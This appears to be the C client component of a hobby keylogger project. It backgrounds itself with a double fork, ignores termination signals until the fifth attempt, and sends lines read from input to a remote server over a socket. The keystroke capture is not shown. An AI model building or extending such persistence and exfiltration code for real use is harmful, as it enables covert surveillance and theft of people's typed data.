#include "client.h"

#include <errno.h>
#include <netinet/in.h>  // sockaddr_in
#include <signal.h>
#include <stdio.h>
#include <stdio.h>  // getline
#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>  // free
#include <stdlib.h>
#include <sys/socket.h>  // connect, sockaddr
#include <sys/stat.h>
#include <unistd.h>

#include "keylogger.h"
#include "server_utils.h"

int signal_counter = 0;

void background_process(void) {
  // process line
  // lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00
  // ./src/main

  // sudo kill -SIGNAL_CODE P_ID
  //-9 for kill, -2 for int
  // sudo kill -9 -- -GROUPID

  printf("Begin Backgrounding 1\n");
  // IMPLEMENTATION HERE

  // umask(0) to clear file creation mask?

  int process_id = fork();
  // printf("backgrounding complete 2\n");

  if (process_id == -1) {
    perror("Failed to fork Process\n");
    // printf("failed to fork 1\n");
    // status 1 is an error
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process

    printf("parent exiting\n");
    exit(0);
  }

  // printf("backgrounding complete 3\n");

  /*
  //create a new process group
  int group_id = setsid();

  if(group_id == -1){
    perror("Failed to create a process group\n");
    exit(errno);
  }*/

  // printf("backgrounding complete 4\n");

  // redirect signals
  immortalize();

  // fork again?

  // printf("backgrounding complete 5\n");
  process_id = fork();

  if (process_id == -1) {
    perror("Failed to fork Process\n");
    // status 1 is an error
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process
    printf("killing parent");
    // raise(SIGKILL);
    exit(0);
    perror("this should not be viewable");
  }
  // printf("backgrounding complete 6\n");
  // change working directory to root

  chdir(getenv("HOME"));

  // set umask to 0

  umask(0);
  // signal handle again just to make sure
  immortalize();
  printf("backgrounding complete\n");
}

void immortalize(void) {
  // Redirect common abort/termination/interrupt signals to ignores

  // int* signal_counter  = malloc(sizeof(int));
  signal(SIGINT, shutdown_signal);
  signal(SIGTERM, shutdown_signal);
  signal(SIGHUP, shutdown_signal);
  signal(SIGABRT, shutdown_signal);
}

// signal handling function
void shutdown_signal(int signal) {
  // global variable signal_counter defined above

  // on 5th actually shutdown
  if (signal_counter > 4) {
    printf("ok, you killed me");
    raise(SIGKILL);
    printf(
        "The program should be killed at this point? This shouldn't be "
        "viewable");
  }
  signal_counter++;
  printf("You tried to shut down but failed");
}

void try_connect(int client_socket, struct sockaddr_in server_addr) {
  if (connect(client_socket, (struct sockaddr*)&server_addr,
              sizeof(server_addr)) < 0) {
    error_and_exit("Error connecting to server");
  }
  printf("CLIENT CONNECTED\n");
}

FILE* get_socket_file(int client_socket) {
  FILE* socket_file = fdopen(client_socket, "w+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream");
  }
  return socket_file;
}

int send_data(FILE* socket_file) {
  char* send_line = NULL;
  size_t send_line_size = 0;
  if (getline(&send_line, &send_line_size, stdin) == -1) {
    return -1;
  }
  // If we can't send the line on the socket, the connection is broken and we
  // have to exit. (
  printf("%s \n", send_line);
  puts("client sent line");
  // printf("%i\n", fileno(socket_file));

  if (fputs(send_line, socket_file) == EOF) {
    free(send_line);
    error_and_exit("Couldn't send line");
  }

  free(send_line);
  char* recv_line = NULL;
  size_t recv_line_size = 0;
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    return 0;
  }
  free(recv_line);
  return 0;
}
